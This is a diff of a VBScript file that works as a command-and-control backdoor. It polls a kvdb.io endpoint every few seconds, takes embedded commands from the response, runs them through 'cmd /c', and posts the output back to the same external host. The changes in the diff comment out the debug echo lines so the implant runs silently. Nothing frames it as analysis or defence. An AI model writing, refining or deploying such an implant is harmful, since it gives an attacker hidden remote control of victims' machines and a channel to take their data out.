@@ -12,12 +12,12 @@ function read_reg(key)
 	Set windowsShell = CreateObject("WScript.Shell")
 	regValue = windowsShell.RegRead(key)
 	read_reg=regValue
-	'Wscript.Echo regValue
+	''WScript.echo regValue
 end function
 
 function execute_cmd(arg1,c_type)
 	
-        'Wscript.Echo arg1 & "CTYPE IS " & c_type
+        ''WScript.echo arg1 & "CTYPE IS " & c_type
 	Set objShell = WScript.CreateObject ("WScript.shell")
 	if c_type = 0 then
 		run_command = "cmd /c "&arg1 &" > c:\temp\output1.txt"
@@ -27,9 +27,9 @@ function execute_cmd(arg1,c_type)
 		execute_cmd = file.ReadAll
 		file.Close
 	else 
-		'Wscript.Echo "Ran command !!"
+		''WScript.echo "Ran command !!"
 		run_command = "cmd /c "&arg1
-		'Wscript.Echo "Command is : "& run_command
+		''WScript.echo "Command is : "& run_command
 		'objShell.run "cmd /c dir"
 		Set objCmdExec = objShell.exec(run_command)
     		getCommandOutput = objCmdExec.StdOut.ReadAll
@@ -49,8 +49,8 @@ function poll()
 	Dim x
 	x=0
 	While i < 100
-		WScript.echo "Iteration : " 
-		WScript.echo x
+		'WScript.echo "Iteration : " 
+		'WScript.echo x
 		x=x+1
 		res="FQM3hbtRhm94tkaLXBm5kF"
 		res_key=res
@@ -67,23 +67,23 @@ function poll()
 		objXmlHttpMain.send
 		resp=objXmlHttpMain.responseText
 		
-		'WScript.echo resp
+		''WScript.echo resp
 		is_new=InStr(resp, "new_command")
 		if is_new <> 0 Then
-			WScript.echo "Is new is present"
+			'WScript.echo "Is new is present"
 			flag_index=is_new+13
 			'(Mid(string, starting number of character, number of characters to extract) 
 			flag_value=Mid(resp,flag_index,1)
 			if flag_value = 1 Then 
-				WScript.echo "Flag value =1 "
+				'WScript.echo "Flag value =1 "
 				st_index=InStr(resp, "##@@@")
 				If st_index <> 0 Then
-					'Wscript.Echo st_index
+					''WScript.echo st_index
 					st_index=st_index+5
 					trimmed=Mid(resp,st_index)
 					end_index=InStr(trimmed, "**")
 					command=Mid(trimmed,1,end_index -1)
-					Wscript.Echo "Command extracted is : " & command
+					'WScript.echo "Command extracted is : " & command
 					command_type=InStr(resp, "c_type")
 					type_value=0
 					if command_type <> 0 Then
@@ -92,11 +92,11 @@ function poll()
 						type_value=Mid(resp,flag_index,1)
 						c_type=type_value
 					end if
-					'Wscript.Echo type_value
+					''WScript.echo type_value
 					call push_and_exe(command,c_type)
 				End If
 			else
-				WScript.echo "No new Command -Pass"
+				'WScript.echo "No new Command -Pass"
 			End If
 		End If
 		WScript.Sleep 5000
@@ -111,7 +111,7 @@ function push_and_exe(command,c_type)
 	'Try
 		proxy=read_reg("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer")
 		text=execute_cmd(command,c_type)
-		Wscript.Echo "Execution result : " '+text
+		'WScript.echo "Execution result : " '+text
 		res="FQM3hbtRhm94tkaLXBm5kF"
 		res_key=res
 		updated_ep="https://kvdb.io/"&res_key&"/hits"
@@ -128,7 +128,7 @@ function push_and_exe(command,c_type)
 		'objXmlHttpMain.setRequestHeader "Content-Type", "application/json"
 		objXmlHttpMain.send strJSONToSend
 		resp=objXmlHttpMain.responseText
-		Wscript.Echo "post resp: " +resp
+		'WScript.echo "post resp: " +resp
 		set objJSONDoc = nothing 
 		set objResult = nothing
 	'Catch e As Exception
